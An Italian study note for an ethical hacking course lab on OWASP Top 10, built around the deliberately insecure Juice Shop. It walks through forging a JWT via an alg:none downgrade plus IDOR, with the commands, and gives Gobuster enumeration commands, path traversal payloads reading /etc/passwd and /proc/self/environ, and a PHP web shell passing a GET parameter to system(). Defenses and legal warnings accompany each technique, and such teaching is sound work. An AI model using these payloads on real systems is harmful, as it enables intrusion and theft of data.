# ETHL 0x03 — Web Security p1

> [!abstract] In una frase Si guarda alla sicurezza web **dal punto di vista dell'attaccante** usando la mappa **OWASP Top 10**, e ci si allena sulla **OWASP Juice Shop** (web app volutamente insicura). Il lab tocca: anatomia di una web app, Top 10 (web + API), un attacco completo a **JWT** (downgrade `alg:none` + **IDOR**), **enumeration** (Gobuster/Seclists, vhost, `robots.txt`), **Burp Suite** come proxy, **path traversal** e **file upload**.

> [!tip] Come usare questa nota Il prof valuta il **perché** ("spiega perché ha funzionato o meno"), non la ricetta. Per ogni tecnica trovi: _cosa fa → perché funziona → come ci si difende_. I comandi delle slide sono **riferimento da saper leggere e commentare all'esame**, non un kit. Tre slide sono letteralmente domande "spiega questo" (22, 28, 31): le ho marcate come [[#Trappole d'esame]].

---

## 1. Web Application Security

### 1.1 Di cosa è fatta una web app

Una web app è una pila di tecnologie. Capire **dove** sta ogni cosa è capire **dove** può rompersi.

|Strato|Tecnologie|Dove può rompersi|
|---|---|---|
|**Front-end**|HTML (struttura), CSS (estetica), **JS** (comportamento dinamico) + framework (Angular, React)|logica client-side aggirabile, segreti nel JS|
|**Server-side scripting**|PHP, Python, Ruby, Perl, Node.js + framework (Django, Flask, Symfony, Rails…)|**qui sta la logica applicativa** e la presentazione (es. MVC) → bug di autorizzazione, injection|
|**Storage**|DBMS SQL/NoSQL, file|dati sensibili, injection, accesso ai file|

> [!info] Front-end vs back-end è una distinzione di **fiducia** Tutto ciò che gira nel browser è sotto il controllo dell'attaccante: può leggere il JS, modificare le richieste, cambiare i cookie. **Nessun controllo di sicurezza fatto solo lato client conta.** Il server deve sempre ri-validare. È il principio che spiega metà delle vulnerabilità del lab.

### 1.2 Web Services e API

- **Web Service** = componente software raggiungibile via internet che offre una funzionalità ad altre applicazioni.
- **API** (Application Programming Interface) = il modo in cui le web app _usano_ i web services (salvare dati, mandare notifiche, integrarsi con sistemi esterni).
- Allargano la **superficie d'attacco**: per questo OWASP mantiene una Top 10 **dedicata** alle API (vedi [[#2.2 OWASP Top 10 API — 2023]]).

### 1.3 OWASP e Juice Shop

**OWASP** (Open Worldwide Application Security Project) = comunità aperta che aiuta a sviluppare/comprare/mantenere app e API affidabili. Mantiene le **Top 10** (web e API): consenso largo sui rischi più critici, costruito con **survey della community + revisione di esperti**.

**OWASP Juice Shop** = web app _volutamente_ insicura, moderna (Angular + Node.js + REST API), il nostro poligono. Si lancia tipicamente con Docker:

```bash
# Riferimento dalle slide — NODE_ENV=unsafe abilita le sfide più "pericolose"
docker run --rm -e NODE_ENV=unsafe -p 3000:3000 bkimminich/juice-shop
# poi http://localhost:3000/#/register per creare un utente
```

> [!note] Perché "unsafe" Senza `NODE_ENV=unsafe` Juice Shop disabilita alcune challenge considerate troppo rischiose (es. RCE). È un poligono: lo si rende deliberatamente più fragile per imparare.

---

## 2. OWASP Top 10

### 2.1 OWASP Top 10 Web — 2025

> [!warning] Punto d'esame: la lista 2025 e i movimenti rispetto al 2021 Il prof può chiedere la lista o cosa è cambiato. Le frecce indicano il movimento rispetto alla Top 10 2021.

|2025|Categoria|Movimento|
|---|---|---|
|**A01**|Broken Access Control|= (resta n.1)|
|**A02**|Security Misconfiguration|▲ (era A05-2021)|
|**A03**|Software Supply Chain Failures|▲ **nuova**|
|**A04**|Cryptographic Failures|▼ (era A02-2021)|
|**A05**|Injection|▼ (era A03-2021)|
|**A06**|Insecure Design|▼ (era A04-2021)|
|**A07**|Authentication Failures|=|
|**A08**|Software or Data Integrity Failures|=|
|**A09**|Security Logging and Alerting Failures|=|
|**A10**|Mishandling of Exceptional Conditions|▲ **nuova**|

**Uscite dalla Top 10:** _A06:2021 Vulnerable and Outdated Components_ e _A10:2021 Server-Side Request Forgery_ (SSRF — assorbita in altre categorie).

> [!tip] Lettura "del perché" **Broken Access Control resta n.1**: è il tipo di bug più diffuso e ad alto impatto, perché riguarda _l'autorizzazione_, che è logica applicativa difficile da automatizzare nei test. Le due **nuove** (Supply Chain, Exceptional Conditions) riflettono trend reali: attacchi alla catena di fornitura del software e gestione errori che leaka informazioni o lascia stati incoerenti.

### 2.2 OWASP Top 10 API — 2023

(latest a febbraio 2026). Nota il **tema dominante**: autorizzazione.

1. **API01** — Broken Object Level Authorization (BOLA) ← è l'IDOR in salsa API
2. **API02** — Broken Authentication
3. **API03** — Broken Object Property Level Authorization
4. **API04** — Unrestricted Resource Consumption
5. **API05** — Broken Function Level Authorization
6. **API06** — Unrestricted Access to Sensitive Business Flows
7. **API07** — Server-Side Request Forgery
8. **API08** — Security Misconfiguration
9. **API09** — Improper Inventory Management
10. **API10** — Unsafe Consumption of APIs

> [!info] Pattern da notare Tre delle prime cinque voci API sono varianti di **autorizzazione rotta** (object level, property level, function level). Il messaggio: nelle API il bug n.1 è "controllo se posso _autenticarmi_, ma non se sono _autorizzato_ su _questo specifico oggetto_". Tienilo a mente per l'IDOR sotto.

### 2.3 A01:2025 — Broken Access Control

> Gli utenti accedono **oltre i propri permessi** → data breach, abuso di funzionalità.

|Sotto-tipo|Esempio|
|---|---|
|Over-permissioned access|troppi privilegi, non basati sul bisogno reale|
|Bypassing checks|manipolare URL, stato dell'app, richieste API|
|**Insecure identifiers (IDOR)**|accedere ad altri account usando ID univoci|
|Unprotected APIs|mancano controlli su azioni sensibili|
|Privilege escalation|elevazione (accidentale o malevola) dei diritti|
|**Metadata manipulation**|manomettere token, cookie, config CORS|
|Forced access|"infilarsi" in aree non autorizzate / privilegiate|

Questo lab esercita **IDOR** + **metadata manipulation** (manomissione del token JWT) insieme.

### 2.4 A04:2025 — Cryptographic Failures

CWE notevoli: **CWE-259** (password hard-coded), **CWE-327** (algoritmo crypto rotto/rischioso), **CWE-331** (entropia insufficiente).

|Sotto-tipo|Esempio|
|---|---|
|Plaintext transmission|protocolli non cifrati (HTTP)|
|Weak crypto|algoritmi/protocolli obsoleti + **downgrade**|
|Randomness issues|RNG non sicuri, seed deboli|
|Hash function hassles|hash legacy/insicuri (MD5, SHA-1)|

> Il **downgrade** è la chiave del prossimo attacco: forzare il sistema a usare crypto più debole (fino a _nessuna_).

---

## 3. JSON Web Tokens (JWT) — l'attacco centrale del lab

> [!abstract] Cosa exploitiamo (slide 22 — **da saper spiegare**)
> 
> - **A04:2025 Cryptographic Failures** → downgrade del protocollo crypto (a `none`)
> - **A01:2025 Broken Access Control** → **IDOR** sull'`id` utente
> 
> Obiettivo: da utente normale → **account admin**.

### 3.1 Cos'è un JWT (RFC 7519)

Metodo standard per rappresentare **claim** (affermazioni) tra due parti. Spesso usato come **cookie di sessione**: il server lo emette al login, il client lo rimanda ad ogni richiesta. Juice Shop usa JWT (cookie `token`).

**Tre parti, separate da punti**, ciascuna in **base64url**:

```
HEADER . PAYLOAD . SIGNATURE
  ^json     ^json      ^binaria (firma di header+payload)
```

![[Pasted image 20260601234825.png]]

|Parte|Contenuto|Esempio|
|---|---|---|
|**Header**|tipo + algoritmo di firma|`{"typ":"JWT","alg":"RS256"}`|
|**Payload**|i claim (i dati): `id`, `email`, `role`…|`{"data":{"id":22,"role":"customer",...}}`|
|**Signature**|firma di `base64(header).base64(payload)`|binario|

> [!info] base64url ≠ sicurezza Header e payload sono **solo codificati**, non cifrati: chiunque li decodifica con `base64 -d`. La sicurezza la dà **la firma**, non la codifica. Confondere "encoding" con "encryption" è l'errore concettuale che l'intero attacco sfrutta.

### 3.2 La firma: RS256 vs HS256

|Algoritmo|Tipo|Come si verifica|
|---|---|---|
|**RS256**|**asimmetrico** (RSA + SHA-256)|firma con **chiave privata** del server, chiunque verifica con la **chiave pubblica**|
|**HS256**|**simmetrico** (HMAC + SHA-256)|firma e verifica con **la stessa chiave segreta** condivisa|

![[Pasted image 20260601234905.png]]

Juice Shop usa **RS256**: solo il server (che ha la chiave privata) può produrre firme valide. In teoria un attaccante non può forgiare un token… _se l'implementazione è corretta_.

### 3.3 Vulnerabilità storiche di JWT

> [!danger] Le due debolezze classiche — perché funzionano
> 
> **1) Downgrade ad `alg:none`** La specifica JWT prevede `alg:none` ("token non firmato"). Una libreria implementata male **legge l'algoritmo dall'header** (controllato dall'attaccante!) e, se trova `none`, **salta del tutto la verifica della firma**. Risultato: l'attaccante può cambiare il payload a piacimento e rimuovere la firma. → Caso reale: **DP-3T** (app di tracciamento contatti COVID-19), **CVE-2020-15957** — mancata validazione della firma quando `alg=none`.![[Pasted image 20260601234935.png]]
> 
> **2) Confusione RS256 → HS256** (`s/RS256/HS256/`) Se l'attaccante cambia `alg` da `RS256` a `HS256`, una libreria ingenua usa **la chiave pubblica RSA come segreto HMAC**. Ma la chiave pubblica è… _pubblica_: l'attaccante la conosce → può calcolare un HMAC valido → forgia token firmati "correttamente". → Richiede di **procurarsi la chiave pubblica** (sulle slide: "prova a trovarla su Juice Shop…").

> [!note] La radice comune Entrambi gli attacchi nascono dallo stesso errore: **fidarsi del campo `alg` scelto dal client**. La difesa è sempre la stessa → vedi [[#3.6 Difese JWT]].

### 3.4 Walkthrough dell'attacco a Juice Shop (riferimento d'esame)

> [!tip] Spiega ogni passo, non recitarlo Le slide 23–28 sono "[practice] login come admin **the hard way**". All'esame conta sapere **cosa fa e perché** ogni comando, non eseguirlo a memoria. Lo riporto in chiave commentata.

**Acquisire il token** — DevTools → Storage → Cookies → copia il valore `token`.
![[Pasted image 20260602000245.png]]

**Step 5–6 — separa e decodifica l'header** (verifica che sia JWT/RS256; l'header è uguale per tutti):

```bash
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" | base64 -d
# {"typ":"JWT","alg":"RS256"}
```

**Step 7–8 — downgrade ad `alg:none`** e ricodifica l'header (togliendo il padding `=`):

```bash
echo -n '{"typ":"JWT","alg":"none"}' | base64 | sed 's/=*$//'
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
```

- _Perché `-n`_: evita il newline finale, che altererebbe il base64.
- _Perché togliere `=`_: il base64url nei JWT **non usa il padding**; un `=` di troppo rende il token malformato.

**Step 9 — IDOR sul payload**: decodifica, cambia `"id":<x>` in `"id":1` (l'admin è tipicamente il primo utente), ricodifica:

```bash
echo "<payload>" | base64 -d | sed 's/"id":[0-9]*/"id":1/' | base64 | sed 's/=*$//'
```

- Questo è il pezzo **A01/IDOR**: l'app si fida dell'`id` nel token e non verifica che _tu_ sia davvero quell'utente.

**Step 10 — riassembla** (attenzione ai **due punti**, la firma è vuota):

```
<nuovo header>.<nuovo payload>.
```

**Step 11 — sostituisci il cookie** e ricarica. _Can you get the Admin account?_

> [!info] Perché in teoria funziona Header dice `none` → libreria vulnerabile salta la verifica → payload con `id:1` accettato → l'app ti tratta come l'utente 1 (admin). Il `.` finale c'è perché il formato richiede tre segmenti, ma la firma è assente.

### 3.5 Anatomia: A01 + A04 insieme

```
        [token utente, RS256, id:22]
                  │
   A04 ───────────┤  downgrade alg → none  (la firma non viene più verificata)
                  │
   A01 ───────────┤  IDOR: id:22 → id:1     (impersoni l'admin)
                  ▼
        [token forgiato, accettato come admin]
```

### 3.6 Difese JWT

> [!success] Come si chiude
> 
> - **Allowlist di algoritmi lato server**: accetta _solo_ l'algoritmo atteso (es. RS256). **Mai** fidarsi del campo `alg` del token. Chiude sia `none` sia la confusione RS256→HS256.
> - **Rifiutare esplicitamente `alg:none`** se non strettamente previsto.
> - **Separare le chiavi**: la chiave di verifica RSA non deve poter essere usata come segreto HMAC.
> - **Autorizzazione server-side per oggetto**: non basta un token valido; verifica che _quell'utente_ possa accedere a _quella risorsa_ (chiude l'IDOR).
> - Librerie aggiornate, scadenza breve (`exp`), rotazione chiavi.

---

## 4. Web Application Enumeration

> Essenziale in **reconnaissance** e **lateral movement**. Due grandi filoni: (1) studiare l'app, (2) scoprire altri host/sottodomini.

### 4.1 Filone 1 — "Play around with the application"

- Usa l'app **come utente normale**, documenta funzioni interessanti; registrati ed esplora gli interni.
- File "well-known" che spesso rivelano percorsi non linkati:

|File|Cosa rivela|
|---|---|
|`robots.txt`|path che il sito chiede ai crawler di non indicizzare → ironicamente, **una mappa di aree sensibili**|
|`.well-known/security.txt`|contatti di sicurezza, a volte altri riferimenti utili|

- **Analizza il traffico** (Browser Inspect → Network): su Juice Shop si vede una **REST API**; l'endpoint `application-configuration` è interessante.
- **Far crashare l'app** spesso rivela lo **stack tecnologico** (messaggi d'errore verbosi → collega ad **A10:2025 Mishandling of Exceptional Conditions** e **A09 logging**).
- _L'esperienza rende tutto più efficace._

> [!tip] Perché `robots.txt` è oro per l'attaccante Non è un controllo di sicurezza: è solo una richiesta gentile ai motori di ricerca. Elencare lì `/admin` o `/backup` significa **dirlo anche all'attaccante**. "Security through obscurity" che si auto-sabota.

### 4.2 Filone 2 — Virtual host / sottodomini (non applicabile a Juice Shop)

Più web app sullo stesso server (virtual hosting). Tecniche **passive** (silenziose, leggittime) vs **attive** (rumorose, ~ attacco):

|Tecnica|Tipo|Note|
|---|---|---|
|Ispezione **certificato X.509** (campo _Subject Alternative Name_)|passiva|un cert può elencare più host (es. `*.repubblica.it`) — a meno di **SNI**|
|**crt.sh** (Certificate Transparency logs)|passiva|cerca certificati emessi per un dominio|
|**Bing `ip:`**|passiva|trova siti sullo stesso IP ("small gem: Bing ancora funziona")|
|**subdomainfinder.c99.nl**|passiva|enumerazione sottodomini|
|**vhost / DNS brute-forcing**|**attiva** ⚠|rumoroso, **può essere considerato un attacco**|

> [!warning] Etica/legalità L'esempio `repubblica.it` sulle slide è **"do not actually attack it"**. La distinzione passiva/attiva è anche **legale**: il brute-forcing genera traffico verso il target e può violare i termini d'uso o la legge. Saper distinguere i due regimi è un punto d'esame.

### 4.3 Gobuster

Brute-forcer per: **URI/directory**, **vhost**, **sottodomini DNS**, bucket GCP/S3, server TFTP.

> [!warning] Disclaimer obbligatorio (dalle slide) A parte forse l'enumerazione DNS, **queste sono attività attive → attacchi**. Solo su target autorizzati (Juice Shop, lab tuoi).

**Wordlist — Seclists** (username, password, URL, payload di fuzzing, web shell…):

```bash
sudo apt -y install seclists          # Kali
git clone https://github.com/danielmiessler/SecLists.git  # altre distro
```

Altre liste utili: `rockyou.txt` in `/usr/share/wordlists/` (pacchetto `wordlists` su Kali).

**Tre modalità da riconoscere:**

```bash
# Sottodomini DNS (la meno "aggressiva")
gobuster dns   -w .../DNS/fierce-hostlist.txt -d google.com

# Virtual host
gobuster vhost -w .../DNS/fierce-hostlist.txt -u www.google.com

# Directory di Juice Shop
gobuster dir   -w .../Web-Content/common.txt --exclude-length 3748 \
               -u http://192.168.1.73:3000/
```

> [!info] Trappola: a cosa serve `--exclude-length 3748`? (slide 38) Juice Shop è una **Single Page Application** (Angular): qualunque path inesistente restituisce **sempre la stessa pagina `index.html`**, con la **stessa lunghezza in byte** e status 200. Senza filtro, Gobuster segnalerebbe _tutto_ come "trovato" (falsi positivi). `--exclude-length 3748` **scarta le risposte di quella lunghezza** (la pagina di fallback), lasciando solo i path realmente diversi. È un esempio di come si adatta lo strumento al comportamento del target.

---

## 5. Burp Suite

**Cos'è**: suite grafica multipiattaforma per il security testing di web app. Copre l'intero processo: dalla **mappatura della superficie d'attacco** fino a **trovare e sfruttare** vulnerabilità.

- **Community Edition** gratuita (limitata ma sufficiente per il corso). Download dal sito PortSwigger.
- Funzione cardine: **proxy intercettante** tra browser e server → vedi/modifichi ogni richiesta e risposta.

> [!info] Perché serve il setup TLS (demo slide 42) Per intercettare **HTTPS**, Burp fa un _man-in-the-middle_ "buono": presenta al browser un certificato firmato dalla **CA di Burp**. Il browser si fida solo se installi quella CA come **trusted**. Senza, vedi errori di certificato. Concettualmente: stai inserendo volontariamente un MITM nel tuo stesso traffico per ispezionarlo. (Collega questo a _come funziona la fiducia TLS_ del corso.)

> [!tip] Burp vs Gobuster Gobuster = brute-forcing **automatico** di path/host (rumoroso, a tappeto). Burp = ispezione/manipolazione **mirata e interattiva** delle singole richieste. Spesso si usano insieme: Gobuster scopre, Burp approfondisce.

---

## 6. Path Traversal

> Parte di **A01:2025 Broken Access Control**.

**Cosa fa**: input malevolo per accedere a **file/directory non autorizzati**, sfruttando come l'app gestisce input dell'utente nei percorsi.

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

> [!info] Perché funziona L'app prende un nome file dall'utente e lo concatena a una directory base senza sanificarlo. La sequenza `../` (parent directory) "risale" l'albero del filesystem fino a uscire dalla cartella prevista e raggiungere file di sistema (`/etc/passwd`, `/proc/self/environ`, ecc.). Su Windows si usa `..\`.

> [!example] Cosa si legge nella demo (slide 45) Recuperando `/proc/self/environ` via `?filename=..%2f..%2f..%2fproc/self/environ` si vedono le **variabili d'ambiente del processo** (HOME, USER, PATH…): info preziose sullo stack e talvolta segreti.

### 6.1 Bypass dei filtri (encoding)

Se l'app filtra `../`, si prova a **codificare** i caratteri così che il filtro non li riconosca ma il filesystem sì.

|Payload|Decodifica|Note|
|---|---|---|
|`%2e%2e%2f`|`../`|URL encoding pieno|
|`%2e%2e/`|`../`|parziale|
|`..%2f`|`../`|solo lo slash|
|`%2e%2e%5c` / `..%5c`|`..\`|variante Windows|
|`%252e%252e%255c` / `..%255c`|`..\`|**double encoding**|
|`..//`|`../`|può ingannare filtri che rimuovono `../` una sola volta|
|`..%c0%af`|`../`|**UTF-8 overlong** (solo sistemi che le accettano)|
|`..%c1%9c`|`..\`|UTF-8 overlong|

> [!tip] Trappola: cos'è il _double encoding_ e perché aggira i filtri `%2f` = `/`. Ma `%` stesso si codifica come `%25`, quindi `%252f` decodifica una volta in `%2f` e una seconda volta in `/`. Se l'app **decodifica due volte** (es. una il web server, una il framework) ma **filtra solo dopo la prima**, il payload passa il controllo (vede `%2f`, non `/`) e arriva al filesystem già come `/`. È il classico mismatch tra _dove si filtra_ e _dove si decodifica_.

> [!todo] Homework / challenge (slide 47) _Trova una path traversal in Juice Shop._ (Suggerimento concettuale: cerca endpoint che servono file per nome — es. nella sezione FTP/ftp del sito — e prova le varianti di encoding sopra.)

### 6.2 Difese

> [!success]
> 
> - **Canonicalizzazione** del path + verifica che il risultato resti _dentro_ la directory consentita (allowlist di base path).
> - **Allowlist** di nomi file ammessi, non blacklist di caratteri.
> - Decodificare **una sola volta** e rifiutare sequenze sospette _dopo_ la canonicalizzazione.
> - Far servire i file statici dal web server, non dalla logica applicativa.

---

## 7. File Upload

> Tocca **più categorie** della Top 10 (Broken Access Control, Injection/RCE, Misconfiguration).

**Causa radice — Unchecked Uploads**: il server accetta qualunque tipo di file senza validazione (o la validazione è aggirabile).

|Rischio|Effetto|
|---|---|
|**Malicious file types**|upload di script (PHP, ASP…) → **RCE** (Remote Code Execution)|
|**Content tampering**|l'upload modifica contenuti del sito o dati utente|

> [!info] Due scenari distinti — punto d'esame
> 
> 1. **Il solo upload basta** a fare danno (es. sovrascrivere un file, alterare contenuti). Nessuna seconda richiesta.
> 2. **Serve una richiesta di follow-up**: l'attaccante carica lo script, poi lo **richiama via HTTP** per farlo **eseguire dal server**. La distinzione (upload-as-damage vs upload-then-trigger) è ciò che il prof vuole sentire articolato.

**Esempi di web shell PHP (dalle slide):**

```php
<?php echo file_get_contents('/proc/self/environ'); ?>   // legge l'ambiente del processo
<?php echo system($_GET['command']); ?>                  // esegue comandi arbitrari → RCE completa
```

> [!info] Perché questi due differiscono Il primo è **passivo/informativo**: legge un file e ne stampa il contenuto (recon, ricerca segreti). Il secondo è una **web shell attiva**: prende un parametro GET `command` e lo passa a `system()` → esecuzione di comandi a piacere sul server. Il secondo è molto più pericoloso (RCE), ed è il collegamento diretto a [[Ethl 0x02 remote access]] (da qui si passa a reverse/bind shell).

> [!example] Demo (slide 51) Su una app PortSwigger si carica `env.php` come "avatar"; poi `curl .../files/avatars/env.php` lo esegue e restituisce le variabili d'ambiente (visibili nell'hexdump). È lo scenario "upload-then-trigger".

### 7.1 Difese

> [!success]
> 
> - **Validare il tipo reale** (magic bytes), non solo l'estensione o il `Content-Type` (entrambi falsificabili).
> - **Rinominare** i file e salvarli **fuori dalla web root**, serviti da un dominio senza esecuzione.
> - Disabilitare l'esecuzione di script nella cartella upload (config server).
> - Allowlist di estensioni, limiti di dimensione, scanning.

---

## 8. Trappole d'esame

> [!danger] Le domande "spiega questo" che ricorrono in questo lab
> 
> 1. **Cosa exploitiamo nell'attacco JWT?** (slide 22) → **A04** crypto downgrade (`alg:none`) **+ A01** IDOR su `id`. Saper dire _perché_ ciascuno funziona.
> 2. **Perché togliere il padding `=`?** → base64url nei JWT non usa padding; un `=` rende il token malformato.
> 3. **Perché il `.` finale nel token forgiato?** → il formato richiede 3 segmenti; la firma è vuota ma il separatore resta.
> 4. **`alg:none` — perché passa?** → la libreria vulnerabile legge l'algoritmo dall'header (controllato dall'attaccante) e salta la verifica della firma. CVE-2020-15957 (DP-3T).
> 5. **RS256→HS256 — perché funziona?** → la chiave pubblica RSA viene usata come segreto HMAC; essendo pubblica, l'attaccante forgia firme valide.
> 6. **A cosa serve `--exclude-length 3748` in Gobuster?** (slide 38) → filtra la pagina di fallback dell'SPA Angular (sempre stessa lunghezza) per eliminare i falsi positivi.
> 7. **Enumeration passiva vs attiva** → cert X.509 / crt.sh / Bing `ip:` (passive, lecite) vs vhost/DNS brute-force (attive, ~attacco).
> 8. **Path traversal: cos'è il double encoding e perché aggira i filtri?** → `%252f`→`%2f`→`/`; mismatch tra dove si filtra e dove si decodifica.
> 9. **File upload: i due scenari?** → upload-as-damage vs upload-then-trigger (RCE via seconda richiesta HTTP).
> 10. **Perché i controlli client-side non contano?** → tutto ciò che gira nel browser è sotto controllo dell'attaccante; il server deve ri-validare.

---

## 9. Tabella riassuntiva difensiva

|Vulnerabilità|Categoria OWASP|Difesa chiave|
|---|---|---|
|JWT `alg:none` / RS256→HS256|A04 + A01|allowlist algoritmi server-side, mai fidarsi di `alg`|
|IDOR|A01 / API01 (BOLA)|autorizzazione **per oggetto**, non solo autenticazione|
|Info via `robots.txt`/errori|A09 / A10|niente segreti in file pubblici, errori non verbosi|
|Path traversal|A01|canonicalizzazione + allowlist base path|
|File upload → RCE|multipla|validare magic bytes, salvare fuori web root, niente exec|
|HTTP in chiaro|A04|TLS ovunque, no downgrade|

---

## 10. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Perché base64url di header/payload **non** protegge un JWT? Cosa lo protegge?
> 2. Differenza RS256 vs HS256 in una frase ciascuno.
> 3. Racconta l'attacco completo Juice Shop dal token utente all'admin, nominando A04 e A01 dove intervengono.
> 4. Perché la reverse shell domina sulla bind nel mondo reale? (collega a [[Bind shell]] e [[Ethl 0x02 remote access]])
> 5. Cosa rivela `robots.txt` a un attaccante e perché è un'arma a doppio taglio?
> 6. Perché Gobuster ha bisogno di `--exclude-length` contro un'SPA?
> 7. Spiega il double URL encoding con un esempio numerico.
> 8. Quali sono i due scenari di un file upload malevolo? Quale porta a RCE?
> 9. Perché un controllo di sicurezza fatto solo nel browser è inutile?
> 10. Nomina tre tecniche **passive** di vhost discovery e una **attiva** (e perché l'ultima è "un attacco").

---

> [!quote] Filo conduttore del lab Quasi tutto ruota attorno a **fidarsi di input controllati dall'attaccante**: il campo `alg` di un JWT, l'`id` nel payload, il nome file in una richiesta, l'estensione di un upload. La difesa è sempre la stessa idea: **non fidarti del client, valida e autorizza sul server**.